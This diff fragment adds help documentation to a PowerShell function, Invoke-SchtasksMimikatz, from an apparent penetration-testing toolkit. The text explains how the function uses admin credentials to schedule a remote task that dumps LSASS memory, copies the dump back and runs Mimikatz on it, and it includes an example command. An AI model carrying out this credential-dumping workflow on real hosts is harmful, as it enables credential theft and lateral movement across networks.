@@ -23,7 +23,47 @@ Get-Content $HostList | Foreach-Object {Invoke-SchtasksMimikatz($_, $Domain, $Us
 }
 
 function Invoke-SchtasksMimikatz{
+<#
+.SYNOPSIS
 
+This module schedules a task on a remote host to create a dump file of the LSASS process. It then copies the dump file to the local machine and runs the Invoke-Mimikatz module against it.
+
+PivotAll Function: Invoke-SchtasksMimikatz
+Author: Beau Bullock (@dafthack) and Brian Fehrman (@fullmetalcache)
+License: BSD 3-Clause
+Required Dependencies: None
+Optional Dependencies: None
+
+.DESCRIPTION
+
+This module schedules a task on a remote host to create a dump file of the LSASS process. It then copies the dump file to the local machine and runs the Invoke-Mimikatz module against it.
+
+.PARAMETER ComputerName
+
+IP address or hostname of the target system
+
+.PARAMETER Domain
+
+Active directory domain name
+
+.PARAMETER User
+
+Username of an administrative user on the remote host
+
+.PARAMETER Pass
+
+Password of the administrative user
+
+.EXAMPLE
+
+C:\PS> Invoke-SchtasksMimikatz -ComputerName 10.10.0.1 -Domain Testdomain -User AdminUser -Pass PassofAdmin1234
+
+Description
+-----------
+This command will setup a share to the remote host at 10.10.0.1 using the administrative credentials of Testdomain\AdminUser user, copy over the procdump.ps1 file, schedule a task to run the procdump.ps1 to create a memory dump of LSASS, copy the lsass.dmp file back over to the testing system, then run Invoke-Mimikatz locally against the dump file.
+
+
+#>
 Param(
  [Parameter(Position = 0, Mandatory = $true)]
  [string]
